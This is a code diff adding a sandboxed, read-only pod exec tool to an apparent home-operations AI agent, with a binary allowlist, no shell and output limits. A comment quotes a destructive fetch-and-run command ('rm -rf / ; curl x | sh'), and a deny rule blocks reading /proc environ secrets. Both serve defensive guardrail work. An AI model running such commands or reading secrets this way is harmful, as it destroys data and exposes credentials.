@@ -8,6 +8,7 @@ from datetime import UTC, datetime
 from typing import TYPE_CHECKING, Any
 
 from kubernetes import client, config
+from kubernetes import stream as _k8s_stream_mod
 from kubernetes.client.rest import ApiException
 
 from home_ops_agent import audit
@@ -18,6 +19,14 @@ if TYPE_CHECKING:
     from home_ops_agent.agent.skills import SkillDefinition
 
 logger = logging.getLogger(__name__)
+
+# Taken as an attribute of the package, not as `from kubernetes.stream import
+# stream`. This file is itself named kubernetes.py, so the dotted form makes the
+# import machinery resolve `kubernetes` to this module and fail with
+# "'kubernetes' is not a package" -- while the plain `from kubernetes import
+# client` above works, because that is satisfied from sys.modules. Binding the
+# callable here also gives tests one place to patch.
+k8s_stream = _k8s_stream_mod.stream
 
 # Initialize Kubernetes client (in-cluster or from kubeconfig)
 try:
@@ -196,6 +205,156 @@ async def get_nodes(params: dict) -> str:
 
 # Namespaces where the agent must NOT take destructive actions
 PROTECTED_NAMESPACES = {"kube-system", "flux-system", "cert-manager"}
+
+
+# --- exec guardrails --------------------------------------------------------
+#
+# Exec is arbitrary code execution inside somebody else's container, run by an
+# agent that acts unattended. The limits below are enforced here rather than
+# described in the tool's prompt, because a prompt is advice and this needs to
+# be a wall.
+#
+# Two properties do the work:
+#
+# 1. There is no shell. argv goes to the Kubernetes exec API as a list, so
+#    pipes, redirection, chaining, globbing and command substitution cannot be
+#    expressed at all. `ps -eo pid,stat` is sayable; `rm -rf / ; curl x | sh`
+#    is not, because there is nothing to interpret the `;`.
+# 2. argv[0] must be one of these. Everything here reads and reports; nothing
+#    writes, deletes, signals, or fetches from the network. Shells and
+#    interpreters are absent deliberately -- allowing `sh` would hand back
+#    everything property 1 removes.
+EXEC_ALLOWED_BINARIES = frozenset(
+    {
+        "ps",
+        "pgrep",
+        "top",
+        "uptime",
+        "free",
+        "vmstat",
+        "nproc",
+        "df",
+        "du",
+        "ls",
+        "stat",
+        "readlink",
+        "find",
+        "cat",
+        "head",
+        "tail",
+        "wc",
+        "grep",
+        "md5sum",
+        "sha256sum",
+        "ss",
+        "netstat",
+        "ip",
+        "hostname",
+        "id",
+        "uname",
+        "date",
+    }
+)
+
+# Reading a process's environment would turn a diagnostic tool into a secret
+# reader: /proc/<pid>/environ holds every value injected by envFrom, and this
+# agent has no Secret-reading tool precisely so that it cannot do that. The
+# output would also land in the transcript and the audit log. `cat` is allowed
+# and useful; `cat /proc/1/environ` is not.
+EXEC_FORBIDDEN_ARG_SUBSTRINGS = ("environ",)
+
+EXEC_TIMEOUT_SECONDS = 20
+EXEC_MAX_OUTPUT_CHARS = 8000
+
+
+def _check_exec_command(command: list[str]) -> str | None:
+    """Return an error payload if this argv is not allowed, else None."""
+    if not isinstance(command, list) or not command:
+        return json.dumps(
+            {"error": "command must be a non-empty list of arguments, e.g. ['ps', '-ef']"}
+        )
+    if not all(isinstance(a, str) for a in command):
+        return json.dumps({"error": "every element of command must be a string"})
+
+    # basename, so /bin/ps and ps are judged the same
+    binary = command[0].rsplit("/", 1)[-1]
+    if binary not in EXEC_ALLOWED_BINARIES:
+        return json.dumps(
+            {
+                "error": (
+                    f"BLOCKED: '{binary}' is not an allowed exec binary. This tool runs "
+                    "read-only diagnostics with no shell, so pipes and chaining are not "
+                    "available either. Allowed: " + ", ".join(sorted(EXEC_ALLOWED_BINARIES))
+                )
+            }
+        )
+
+    for arg in command:
+        lowered = arg.lower()
+        for bad in EXEC_FORBIDDEN_ARG_SUBSTRINGS:
+            if bad in lowered:
+                return json.dumps(
+                    {
+                        "error": (
+                            f"BLOCKED: argument {arg!r} contains {bad!r}. Reading a "
+                            "process environment would expose injected secrets, which "
+                            "this agent deliberately cannot do."
+                        )
+                    }
+                )
+    return None
+
+
+# Deliberately not @audit.records: the write audit is a list of changes the
+# agent made, and these commands change nothing. test_every_write_tool_records_
+# itself enforces both halves of that, and it caught this when the decorator
+# was here -- a `ps` listing in the audit would bury the writes it exists to
+# surface.
+async def exec_in_pod(params: dict) -> str:
+    """Run one read-only diagnostic command inside a running container.
+
+    Exists because pod status cannot answer questions about what is happening
+    *inside* a container. Asked to look for zombie processes in ai-harness, the
+    agent could report only "Running and Ready, zero restarts" -- true, and no
+    evidence either way, since a zombie shows up in none of it.
+    """
+    name = params["name"]
+    namespace = params["namespace"]
+    container = params.get("container")
+    command = params.get("command")
+
+    if error := _check_exec_command(command):
+        return error
+
+    try:
+        output = k8s_stream(
+            core_v1.connect_get_namespaced_pod_exec,
+            name,
+            namespace,
+            container=container,
+            command=command,
+            stderr=True,
+            stdin=False,
+            stdout=True,
+            tty=False,
+            _preload_content=True,
+            _request_timeout=EXEC_TIMEOUT_SECONDS,
+        )
+    except ApiException as e:
+        return json.dumps({"error": f"exec failed: {e.reason}"})
+    except Exception as e:  # noqa: BLE001 -- websocket/timeout failures are not ApiException
+        return json.dumps({"error": f"exec failed: {e}"})
+
+    output = output or "(no output)"
+    truncated = len(output) > EXEC_MAX_OUTPUT_CHARS
+    if truncated:
+        # Say so. A silently cut listing reads as a complete one, and "no
+        # zombies after this point" would then be a conclusion drawn from
+        # output that was never seen.
+        output = output[:EXEC_MAX_OUTPUT_CHARS] + "\n...(truncated)"
+
+    label = f"exec {namespace}/{name}" + (f" [{container}]" if container else "")
+    return untrusted.wrap(label, output)
 
 
 @audit.records("k8s_restart_workload")
@@ -393,6 +552,47 @@ def get_kubernetes_tools() -> list[ToolDefinition]:
                 "required": ["name", "namespace"],
             },
             handler=delete_pod,
+        ),
+        ToolDefinition(
+            name="k8s_exec",
+            description=(
+                "Run ONE read-only diagnostic command inside a running container and "
+                "return its output. Use this when a question is about what is happening "
+                "inside a container rather than about the pod around it -- process "
+                "tables, open sockets, disk usage, a file's contents. Pod phase, Ready "
+                "and restart count cannot answer those, and reporting them instead is "
+                "not an answer.\n\n"
+                "There is no shell: pass argv as a list, like ['ps', '-eo', "
+                "'pid,ppid,stat,comm']. Pipes, redirection, &&, ; and $() do not work "
+                "because nothing interprets them -- filter the output yourself after "
+                "reading it. Only read-only binaries are permitted and the call is "
+                "rejected if you reach for another."
+            ),
+            input_schema={
+                "type": "object",
+                "properties": {
+                    "name": {"type": "string", "description": "Pod name"},
+                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
+                    "container": {
+                        "type": "string",
+                        "description": (
+                            "Container name. Required when the pod has more than one; "
+                            "omitting it then fails rather than guessing."
+                        ),
+                    },
+                    "command": {
+                        "type": "array",
+                        "items": {"type": "string"},
+                        "description": (
+                            "argv as a list, NOT a shell string. "
+                            "['ps', '-eo', 'pid,ppid,stat,comm'] is correct; "
+                            "['sh', '-c', 'ps | grep Z'] is rejected."
+                        ),
+                    },
+                },
+                "required": ["name", "namespace", "command"],
+            },
+            handler=exec_in_pod,
         ),
     ]
 
